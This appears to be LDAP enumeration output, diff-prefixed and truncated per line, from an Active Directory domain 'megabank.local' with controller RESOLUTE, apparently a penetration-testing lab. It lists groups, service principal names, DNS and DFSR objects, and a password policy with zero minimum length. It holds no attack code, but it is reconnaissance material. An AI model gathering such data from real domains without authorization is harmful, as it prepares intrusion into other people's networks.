+name: ipsecNFA{72385232-70FA-11D1-864C-14A300000000}
+ipsecName: Request Security (Optional) Rule
+distinguishedName: CN=ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Sec
+name: ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}
+distinguishedName: CN=ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17},CN=IP Sec
+name: ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}
+ipsecName: Permit unsecure ICMP packets to pass through.
+distinguishedName: CN=ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000
+name: ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}
+ipsecName: Request Security (Optional)
+distinguishedName: CN=ipsecFilter{7238523A-70FA-11D1-864C-14A300000000},CN=IP
+name: ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}
+ipsecName: All IP Traffic
+distinguishedName: CN=ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECC
+name: ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}
+distinguishedName: CN=ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000
+name: ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}
+ipsecName: Permit
+distinguishedName: CN=ipsecFilter{72385235-70FA-11D1-864C-14A300000000},CN=IP
+name: ipsecFilter{72385235-70FA-11D1-864C-14A300000000}
+ipsecName: All ICMP Traffic
+distinguishedName: CN=ipsecPolicy{72385236-70FA-11D1-864C-14A300000000},CN=IP
+name: ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}
+ipsecName: Client (Respond Only)
+distinguishedName: CN=ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000},
+name: ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}
+distinguishedName: CN=ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Sec
+name: ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}
+distinguishedName: CN=ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECC
+name: ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}
+distinguishedName: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=IP
+name: ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}
+ipsecName: Secure Server (Require Security)
+distinguishedName: CN=ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000},
+name: ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}
+distinguishedName: CN=ipsecNFA{7238523E-70FA-11D1-864C-14A300000000},CN=IP Sec
+name: ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}
+ipsecName: Require Security
+distinguishedName: CN=ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Sec
+name: ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}
+distinguishedName: CN=ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17},CN=IP Sec
+name: ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}
+ipsecName: Permit unsecure ICMP packets to pass through.
+distinguishedName: CN=ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000
+name: ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}
+ipsecName: Require Security
+distinguishedName: CN=ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECC
+name: ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}
+distinguishedName: CN=ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17},CN=IP Sec
+name: ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}
+ipsecName: Version Information Object
+distinguishedName: CN=ComPartitions,CN=System,DC=megabank,DC=local
+name: ComPartitions
+distinguishedName: CN=ComPartitionSets,CN=System,DC=megabank,DC=local
+name: ComPartitionSets
+distinguishedName: CN=DomainUpdates,CN=System,DC=megabank,DC=local
+name: DomainUpdates
+distinguishedName: CN=Operations,CN=DomainUpdates,CN=System,DC=megabank,DC=loc
+name: Operations
+distinguishedName: CN=ab402345-d3c3-455d-9ff7-40268a1099b6,CN=Operations,CN=Do
+name: ab402345-d3c3-455d-9ff7-40268a1099b6
+distinguishedName: CN=bab5f54d-06c8-48de-9b87-d78b796564e4,CN=Operations,CN=Do
+name: bab5f54d-06c8-48de-9b87-d78b796564e4
+distinguishedName: CN=f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5,CN=Operations,CN=Do
+name: f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5
+distinguishedName: CN=2416c60a-fe15-4d7a-a61e-dffd5df864d3,CN=Operations,CN=Do
+name: 2416c60a-fe15-4d7a-a61e-dffd5df864d3
+distinguishedName: CN=7868d4c8-ac41-4e05-b401-776280e8e9f1,CN=Operations,CN=Do
+name: 7868d4c8-ac41-4e05-b401-776280e8e9f1
+distinguishedName: CN=860c36ed-5241-4c62-a18b-cf6ff9994173,CN=Operations,CN=Do
+name: 860c36ed-5241-4c62-a18b-cf6ff9994173
+distinguishedName: CN=0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e,CN=Operations,CN=Do
+name: 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e
+distinguishedName: CN=a86fe12a-0f62-4e2a-b271-d27f601f8182,CN=Operations,CN=Do
+name: a86fe12a-0f62-4e2a-b271-d27f601f8182
+distinguishedName: CN=d85c0bfd-094f-4cad-a2b5-82ac9268475d,CN=Operations,CN=Do
+name: d85c0bfd-094f-4cad-a2b5-82ac9268475d
+distinguishedName: CN=6ada9ff7-c9df-45c1-908e-9fef2fab008a,CN=Operations,CN=Do
+name: 6ada9ff7-c9df-45c1-908e-9fef2fab008a
+distinguishedName: CN=10b3ad2a-6883-4fa7-90fc-6377cbdc1b26,CN=Operations,CN=Do
+name: 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26
+distinguishedName: CN=98de1d3e-6611-443b-8b4e-f4337f1ded0b,CN=Operations,CN=Do
+name: 98de1d3e-6611-443b-8b4e-f4337f1ded0b
+distinguishedName: CN=f607fd87-80cf-45e2-890b-6cf97ec0e284,CN=Operations,CN=Do
+name: f607fd87-80cf-45e2-890b-6cf97ec0e284
+distinguishedName: CN=9cac1f66-2167-47ad-a472-2a13251310e4,CN=Operations,CN=Do
+name: 9cac1f66-2167-47ad-a472-2a13251310e4
+distinguishedName: CN=6ff880d6-11e7-4ed1-a20f-aac45da48650,CN=Operations,CN=Do
+name: 6ff880d6-11e7-4ed1-a20f-aac45da48650
+distinguishedName: CN=446f24ea-cfd5-4c52-8346-96e170bcb912,CN=Operations,CN=Do
+name: 446f24ea-cfd5-4c52-8346-96e170bcb912
+distinguishedName: CN=51cba88b-99cf-4e16-bef2-c427b38d0767,CN=Operations,CN=Do
+name: 51cba88b-99cf-4e16-bef2-c427b38d0767
+distinguishedName: CN=a3dac986-80e7-4e59-a059-54cb1ab43cb9,CN=Operations,CN=Do
+name: a3dac986-80e7-4e59-a059-54cb1ab43cb9
+distinguishedName: CN=293f0798-ea5c-4455-9f5d-45f33a30703b,CN=Operations,CN=Do
+name: 293f0798-ea5c-4455-9f5d-45f33a30703b
+distinguishedName: CN=5c82b233-75fc-41b3-ac71-c69592e6bf15,CN=Operations,CN=Do
+name: 5c82b233-75fc-41b3-ac71-c69592e6bf15
+distinguishedName: CN=7ffef925-405b-440a-8d58-35e8cd6e98c3,CN=Operations,CN=Do
+name: 7ffef925-405b-440a-8d58-35e8cd6e98c3
+distinguishedName: CN=4dfbb973-8a62-4310-a90c-776e00f83222,CN=Operations,CN=Do
+name: 4dfbb973-8a62-4310-a90c-776e00f83222
+distinguishedName: CN=8437C3D8-7689-4200-BF38-79E4AC33DFA0,CN=Operations,CN=Do
+name: 8437C3D8-7689-4200-BF38-79E4AC33DFA0
+distinguishedName: CN=7cfb016c-4f87-4406-8166-bd9df943947f,CN=Operations,CN=Do
+name: 7cfb016c-4f87-4406-8166-bd9df943947f
+distinguishedName: CN=f7ed4553-d82b-49ef-a839-2f38a36bb069,CN=Operations,CN=Do
+name: f7ed4553-d82b-49ef-a839-2f38a36bb069
+distinguishedName: CN=8ca38317-13a4-4bd4-806f-ebed6acb5d0c,CN=Operations,CN=Do
+name: 8ca38317-13a4-4bd4-806f-ebed6acb5d0c
+distinguishedName: CN=3c784009-1f57-4e2a-9b04-6915c9e71961,CN=Operations,CN=Do
+name: 3c784009-1f57-4e2a-9b04-6915c9e71961
+distinguishedName: CN=6bcd5678-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5678-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5679-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5679-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd567a-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd567a-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd567b-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd567b-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd567c-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd567c-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd567d-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd567d-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd567e-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd567e-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd567f-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd567f-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5680-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5680-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5681-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5681-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5682-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5682-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5683-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5683-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5684-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5684-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5685-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5685-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5686-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5686-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5687-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5687-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5688-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5688-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd5689-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd5689-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd568a-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd568a-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd568b-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd568b-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd568c-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd568c-8314-11d6-977b-00c04f613221
+distinguishedName: CN=6bcd568d-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
+name: 6bcd568d-8314-11d6-977b-00c04f613221
+distinguishedName: CN=3051c66f-b332-4a73-9a20-2d6a7d6e6a1c,CN=Operations,CN=Do
+name: 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c
+distinguishedName: CN=3e4f4182-ac5d-4378-b760-0eab2de593e2,CN=Operations,CN=Do
+name: 3e4f4182-ac5d-4378-b760-0eab2de593e2
+distinguishedName: CN=c4f17608-e611-11d6-9793-00c04f613221,CN=Operations,CN=Do
+name: c4f17608-e611-11d6-9793-00c04f613221
+distinguishedName: CN=13d15cf0-e6c8-11d6-9793-00c04f613221,CN=Operations,CN=Do
+name: 13d15cf0-e6c8-11d6-9793-00c04f613221
+distinguishedName: CN=8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c,CN=Operations,CN=Do
+name: 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c
+distinguishedName: CN=dda1d01d-4bd7-4c49-a184-46f9241b560e,CN=Operations,CN=Do
+name: dda1d01d-4bd7-4c49-a184-46f9241b560e
+distinguishedName: CN=a1789bfb-e0a2-4739-8cc0-e77d892d080a,CN=Operations,CN=Do
+name: a1789bfb-e0a2-4739-8cc0-e77d892d080a
+distinguishedName: CN=61b34cb0-55ee-4be9-b595-97810b92b017,CN=Operations,CN=Do
+name: 61b34cb0-55ee-4be9-b595-97810b92b017
+distinguishedName: CN=57428d75-bef7-43e1-938b-2e749f5a8d56,CN=Operations,CN=Do
+name: 57428d75-bef7-43e1-938b-2e749f5a8d56
+distinguishedName: CN=ebad865a-d649-416f-9922-456b53bbb5b8,CN=Operations,CN=Do
+name: ebad865a-d649-416f-9922-456b53bbb5b8
+distinguishedName: CN=0b7fb422-3609-4587-8c2e-94b10f67d1bf,CN=Operations,CN=Do
+name: 0b7fb422-3609-4587-8c2e-94b10f67d1bf
+distinguishedName: CN=2951353e-d102-4ea5-906c-54247eeec741,CN=Operations,CN=Do
+name: 2951353e-d102-4ea5-906c-54247eeec741
+distinguishedName: CN=71482d49-8870-4cb3-a438-b6fc9ec35d70,CN=Operations,CN=Do
+name: 71482d49-8870-4cb3-a438-b6fc9ec35d70
+distinguishedName: CN=aed72870-bf16-4788-8ac7-22299c8207f1,CN=Operations,CN=Do
+name: aed72870-bf16-4788-8ac7-22299c8207f1
+distinguishedName: CN=f58300d1-b71a-4DB6-88a1-a8b9538beaca,CN=Operations,CN=Do
+name: f58300d1-b71a-4DB6-88a1-a8b9538beaca
+distinguishedName: CN=231fb90b-c92a-40c9-9379-bacfc313a3e3,CN=Operations,CN=Do
+name: 231fb90b-c92a-40c9-9379-bacfc313a3e3
+distinguishedName: CN=4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0,CN=Operations,CN=Do
+name: 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0
+distinguishedName: CN=9738c400-7795-4d6e-b19d-c16cd6486166,CN=Operations,CN=Do
+name: 9738c400-7795-4d6e-b19d-c16cd6486166
+distinguishedName: CN=de10d491-909f-4fb0-9abb-4b7865c0fe80,CN=Operations,CN=Do
+name: de10d491-909f-4fb0-9abb-4b7865c0fe80
+distinguishedName: CN=b96ed344-545a-4172-aa0c-68118202f125,CN=Operations,CN=Do
+name: b96ed344-545a-4172-aa0c-68118202f125
+distinguishedName: CN=4c93ad42-178a-4275-8600-16811d28f3aa,CN=Operations,CN=Do
+name: 4c93ad42-178a-4275-8600-16811d28f3aa
+distinguishedName: CN=c88227bc-fcca-4b58-8d8a-cd3d64528a02,CN=Operations,CN=Do
+name: c88227bc-fcca-4b58-8d8a-cd3d64528a02
+distinguishedName: CN=5e1574f6-55df-493e-a671-aaeffca6a100,CN=Operations,CN=Do
+name: 5e1574f6-55df-493e-a671-aaeffca6a100
+distinguishedName: CN=d262aae8-41f7-48ed-9f35-56bbb677573d,CN=Operations,CN=Do
+name: d262aae8-41f7-48ed-9f35-56bbb677573d
+distinguishedName: CN=82112ba0-7e4c-4a44-89d9-d46c9612bf91,CN=Operations,CN=Do
+name: 82112ba0-7e4c-4a44-89d9-d46c9612bf91
+distinguishedName: CN=c3c927a6-cc1d-47c0-966b-be8f9b63d991,CN=Operations,CN=Do
+name: c3c927a6-cc1d-47c0-966b-be8f9b63d991
+distinguishedName: CN=54afcfb9-637a-4251-9f47-4d50e7021211,CN=Operations,CN=Do
+name: 54afcfb9-637a-4251-9f47-4d50e7021211
+distinguishedName: CN=f4728883-84dd-483c-9897-274f2ebcf11e,CN=Operations,CN=Do
+name: f4728883-84dd-483c-9897-274f2ebcf11e
+distinguishedName: CN=ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff,CN=Operations,CN=Do
+name: ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff
+distinguishedName: CN=83C53DA7-427E-47A4-A07A-A324598B88F7,CN=Operations,CN=Do
+name: 83C53DA7-427E-47A4-A07A-A324598B88F7
+distinguishedName: CN=C81FC9CC-0130-4FD1-B272-634D74818133,CN=Operations,CN=Do
+name: C81FC9CC-0130-4FD1-B272-634D74818133
+distinguishedName: CN=E5F9E791-D96D-4FC9-93C9-D53E1DC439BA,CN=Operations,CN=Do
+name: E5F9E791-D96D-4FC9-93C9-D53E1DC439BA
+distinguishedName: CN=e6d5fd00-385d-4e65-b02d-9da3493ed850,CN=Operations,CN=Do
+name: e6d5fd00-385d-4e65-b02d-9da3493ed850
+distinguishedName: CN=3a6b3fbf-3168-4312-a10d-dd5b3393952d,CN=Operations,CN=Do
+name: 3a6b3fbf-3168-4312-a10d-dd5b3393952d
+distinguishedName: CN=7F950403-0AB3-47F9-9730-5D7B0269F9BD,CN=Operations,CN=Do
+name: 7F950403-0AB3-47F9-9730-5D7B0269F9BD
+distinguishedName: CN=434bb40d-dbc9-4fe7-81d4-d57229f7b080,CN=Operations,CN=Do
+name: 434bb40d-dbc9-4fe7-81d4-d57229f7b080
+distinguishedName: CN=Windows2003Update,CN=DomainUpdates,CN=System,DC=megabank
+name: Windows2003Update
+distinguishedName: CN=ActiveDirectoryUpdate,CN=DomainUpdates,CN=System,DC=mega
+name: ActiveDirectoryUpdate
+distinguishedName: CN=Password Settings Container,CN=System,DC=megabank,DC=loc
+name: Password Settings Container
+distinguishedName: CN=PSPs,CN=System,DC=megabank,DC=local
+name: PSPs
+distinguishedName: CN=TPM Devices,DC=megabank,DC=local
+name: TPM Devices
+distinguishedName: CN=Guest,CN=Users,DC=megabank,DC=local
+name: Guest
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: Guest
+distinguishedName: CN=DefaultAccount,CN=Users,DC=megabank,DC=local
+name: DefaultAccount
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: DefaultAccount
+distinguishedName: CN=Builtin,DC=megabank,DC=local
+name: Builtin
+maxPwdAge: -37108517437440
+minPwdAge: 0
+minPwdLength: 0
+pwdProperties: 0
+pwdHistoryLength: 0
+distinguishedName: CN=Users,CN=Builtin,DC=megabank,DC=local
+name: Users
+sAMAccountName: Users
+distinguishedName: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=megabank,DC=loca
+name: S-1-5-4
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=megabank,DC=loc
+name: S-1-5-11
+distinguishedName: CN=Guests,CN=Builtin,DC=megabank,DC=local
+name: Guests
+sAMAccountName: Guests
+distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=megabank,DC=local
+name: Remote Desktop Users
+sAMAccountName: Remote Desktop Users
+distinguishedName: CN=Network Configuration Operators,CN=Builtin,DC=megabank,D
+name: Network Configuration Operators
+sAMAccountName: Network Configuration Operators
+distinguishedName: CN=Performance Monitor Users,CN=Builtin,DC=megabank,DC=loca
+name: Performance Monitor Users
+sAMAccountName: Performance Monitor Users
+distinguishedName: CN=Performance Log Users,CN=Builtin,DC=megabank,DC=local
+name: Performance Log Users
+sAMAccountName: Performance Log Users
+distinguishedName: CN=Distributed COM Users,CN=Builtin,DC=megabank,DC=local
+name: Distributed COM Users
+sAMAccountName: Distributed COM Users
+distinguishedName: CN=IIS_IUSRS,CN=Builtin,DC=megabank,DC=local
+name: IIS_IUSRS
+sAMAccountName: IIS_IUSRS
+distinguishedName: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=megabank,DC=loc
+name: S-1-5-17
+distinguishedName: CN=Cryptographic Operators,CN=Builtin,DC=megabank,DC=local
+name: Cryptographic Operators
+sAMAccountName: Cryptographic Operators
+distinguishedName: CN=Event Log Readers,CN=Builtin,DC=megabank,DC=local
+name: Event Log Readers
+sAMAccountName: Event Log Readers
+distinguishedName: CN=Certificate Service DCOM Access,CN=Builtin,DC=megabank,D
+name: Certificate Service DCOM Access
+sAMAccountName: Certificate Service DCOM Access
+distinguishedName: CN=RDS Remote Access Servers,CN=Builtin,DC=megabank,DC=loca
+name: RDS Remote Access Servers
+sAMAccountName: RDS Remote Access Servers
+distinguishedName: CN=RDS Endpoint Servers,CN=Builtin,DC=megabank,DC=local
+name: RDS Endpoint Servers
+sAMAccountName: RDS Endpoint Servers
+distinguishedName: CN=RDS Management Servers,CN=Builtin,DC=megabank,DC=local
+name: RDS Management Servers
+sAMAccountName: RDS Management Servers
+distinguishedName: CN=Hyper-V Administrators,CN=Builtin,DC=megabank,DC=local
+name: Hyper-V Administrators
+sAMAccountName: Hyper-V Administrators
+distinguishedName: CN=Access Control Assistance Operators,CN=Builtin,DC=megaba
+name: Access Control Assistance Operators
+sAMAccountName: Access Control Assistance Operators
+is applies only to WMI namespaces that grant access to the user.
+distinguishedName: CN=Remote Management Users,CN=Builtin,DC=megabank,DC=local
+name: Remote Management Users
+sAMAccountName: Remote Management Users
+distinguishedName: CN=System Managed Accounts Group,CN=Builtin,DC=megabank,DC=
+name: System Managed Accounts Group
+sAMAccountName: System Managed Accounts Group
+distinguishedName: CN=Storage Replica Administrators,CN=Builtin,DC=megabank,DC
+name: Storage Replica Administrators
+sAMAccountName: Storage Replica Administrators
+distinguishedName: CN=Server,CN=System,DC=megabank,DC=local
+name: Server
+distinguishedName: CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC=local
+displayName: RESOLUTE$
+name: RESOLUTE
+badPwdCount: 0
+pwdLastSet: 133829872997380546
+sAMAccountName: RESOLUTE$
+serverReferenceBL: CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,
+dNSHostName: Resolute.megabank.local
+servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/Resolute.megab
+servicePrincipalName: ldap/Resolute.megabank.local/ForestDnsZones.megabank.loc
+servicePrincipalName: ldap/Resolute.megabank.local/DomainDnsZones.megabank.loc
+servicePrincipalName: DNS/Resolute.megabank.local
+servicePrincipalName: GC/Resolute.megabank.local/megabank.local
+servicePrincipalName: HOST/Resolute.megabank.local/MEGABANK
+servicePrincipalName: HOST/Resolute.megabank.local/megabank.local
+servicePrincipalName: ldap/Resolute.megabank.local/MEGABANK
+servicePrincipalName: ldap/Resolute.megabank.local
+servicePrincipalName: ldap/Resolute.megabank.local/megabank.local
+servicePrincipalName: RestrictedKrbHost/Resolute.megabank.local
+servicePrincipalName: HOST/Resolute.megabank.local
+servicePrincipalName: RestrictedKrbHost/RESOLUTE
+servicePrincipalName: HOST/RESOLUTE/MEGABANK
+servicePrincipalName: HOST/RESOLUTE
+servicePrincipalName: ldap/RESOLUTE/MEGABANK
+servicePrincipalName: ldap/RESOLUTE
+servicePrincipalName: RPC/b9024923-44e7-4b82-83d5-7e0d199af2bc._msdcs.megabank
+servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/b9024923-44e7-4b82-
+servicePrincipalName: ldap/b9024923-44e7-4b82-83d5-7e0d199af2bc._msdcs.megaban
+distinguishedName: CN=Domain Computers,CN=Users,DC=megabank,DC=local
+name: Domain Computers
+sAMAccountName: Domain Computers
+distinguishedName: CN=Cert Publishers,CN=Users,DC=megabank,DC=local
+name: Cert Publishers
+sAMAccountName: Cert Publishers
+distinguishedName: CN=Domain Users,CN=Users,DC=megabank,DC=local
+name: Domain Users
+sAMAccountName: Domain Users
+distinguishedName: CN=Domain Guests,CN=Users,DC=megabank,DC=local
+name: Domain Guests
+sAMAccountName: Domain Guests
+distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=megabank,DC=loca
+name: Group Policy Creator Owners
+sAMAccountName: Group Policy Creator Owners
+distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=megabank,DC=local
+name: RAS and IAS Servers
+sAMAccountName: RAS and IAS Servers
+distinguishedName: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=megaban
+name: Pre-Windows 2000 Compatible Access
+sAMAccountName: Pre-Windows 2000 Compatible Access
+distinguishedName: CN=Incoming Forest Trust Builders,CN=Builtin,DC=megabank,DC
+name: Incoming Forest Trust Builders
+sAMAccountName: Incoming Forest Trust Builders
+distinguishedName: CN=Windows Authorization Access Group,CN=Builtin,DC=megaban
+name: Windows Authorization Access Group
+sAMAccountName: Windows Authorization Access Group
+distinguishedName: CN=Terminal Server License Servers,CN=Builtin,DC=megabank,D
+name: Terminal Server License Servers
+sAMAccountName: Terminal Server License Servers
+distinguishedName: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=megabank,DC=loca
+name: S-1-5-9
+distinguishedName: CN=6E157EDF-4E72-4052-A82A-EC3F91021A22,CN=Operations,CN=Do
+name: 6E157EDF-4E72-4052-A82A-EC3F91021A22
+distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=mega
+name: Allowed RODC Password Replication Group
+sAMAccountName: Allowed RODC Password Replication Group
+distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=megab
+name: Denied RODC Password Replication Group
+sAMAccountName: Denied RODC Password Replication Group
+distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=mega
+name: Enterprise Read-only Domain Controllers
+sAMAccountName: Enterprise Read-only Domain Controllers
+distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=megabank,DC=loc
+name: Cloneable Domain Controllers
+sAMAccountName: Cloneable Domain Controllers
+distinguishedName: CN=Protected Users,CN=Users,DC=megabank,DC=local
+name: Protected Users
+sAMAccountName: Protected Users
+distinguishedName: CN=Key Admins,CN=Users,DC=megabank,DC=local
+name: Key Admins
+sAMAccountName: Key Admins
+distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=megabank,DC=local
+name: Enterprise Key Admins
+sAMAccountName: Enterprise Key Admins
+distinguishedName: CN=RID Manager$,CN=System,DC=megabank,DC=local
+name: RID Manager$
+distinguishedName: CN=RID Set,CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC
+name: RID Set
+distinguishedName: CN=DnsAdmins,CN=Users,DC=megabank,DC=local
+name: DnsAdmins
+sAMAccountName: DnsAdmins
+distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=megabank,DC=local
+name: DnsUpdateProxy
+sAMAccountName: DnsUpdateProxy
+distinguishedName: CN=MicrosoftDNS,CN=System,DC=megabank,DC=local
+displayName: DNS Servers
+name: MicrosoftDNS
+distinguishedName: DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=megabank,DC=
+name: RootDNSServers
+distinguishedName: DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=megaban
+name: @
+distinguishedName: DC=A.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: A.ROOT-SERVERS.NET
+distinguishedName: DC=B.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: B.ROOT-SERVERS.NET
+distinguishedName: DC=C.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: C.ROOT-SERVERS.NET
+distinguishedName: DC=D.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: D.ROOT-SERVERS.NET
+distinguishedName: DC=E.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: E.ROOT-SERVERS.NET
+distinguishedName: DC=F.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: F.ROOT-SERVERS.NET
+distinguishedName: DC=G.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: G.ROOT-SERVERS.NET
+distinguishedName: DC=H.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: H.ROOT-SERVERS.NET
+distinguishedName: DC=I.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: I.ROOT-SERVERS.NET
+distinguishedName: DC=J.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: J.ROOT-SERVERS.NET
+distinguishedName: DC=K.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: K.ROOT-SERVERS.NET
+distinguishedName: DC=L.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: L.ROOT-SERVERS.NET
+distinguishedName: DC=M.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
+name: M.ROOT-SERVERS.NET
+distinguishedName: CN=DFSR-GlobalSettings,CN=System,DC=megabank,DC=local
+name: DFSR-GlobalSettings
+distinguishedName: CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC
+name: Domain System Volume
+distinguishedName: CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,C
+name: Content
+distinguishedName: CN=SYSVOL Share,CN=Content,CN=Domain System Volume,CN=DFSR-
+name: SYSVOL Share
+distinguishedName: CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,
+name: Topology
